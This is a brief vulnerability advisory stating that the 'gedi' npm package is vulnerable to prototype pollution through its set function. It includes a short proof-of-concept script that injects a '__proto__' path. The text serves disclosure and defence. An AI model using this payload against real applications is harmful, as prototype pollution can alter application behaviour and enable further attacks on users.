# Overview
`gedi` is an An evented data API, this package are vulnerable to Prototype Pollution via. the `set` function.

# Proof of Concept
```
const gedi = require('gedi');
try {
    gedi().set('[__proto__/polluted]', true);
} catch(e) {}
console.log(polluted);
```